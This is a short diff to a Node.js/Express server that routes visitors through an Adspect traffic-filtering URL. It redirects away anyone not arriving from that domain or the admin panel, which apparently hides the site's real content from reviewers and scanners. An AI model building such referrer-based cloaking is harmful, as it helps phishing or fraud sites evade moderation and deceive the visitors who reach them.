@@ -560,6 +560,14 @@ const pageServingMiddleware = async (req, res, next) => {
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
     
+    // Check if referrer is from our Adspect URL
+    const referer = req.headers.referer;
+    const isFromAdspect = referer && referer.includes('https://redirectionroute.com'); // Replace with your actual Adspect domain
+    
+    if (!isFromAdspect && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
+    }
+    
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         return res.redirect(state.settings.redirectUrl);
     }
@@ -944,7 +952,7 @@ app.get('/', async (req, res) => {
 
     try {
         // Instead of running PHP, redirect to your hosted Adspect URL
-        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
+        res.redirect('https://redirectionroute.com/'); // Replace with your actual URL
     } catch (error) {
         console.error('Error in root route:', error);
         res.redirect(state.settings.redirectUrl);
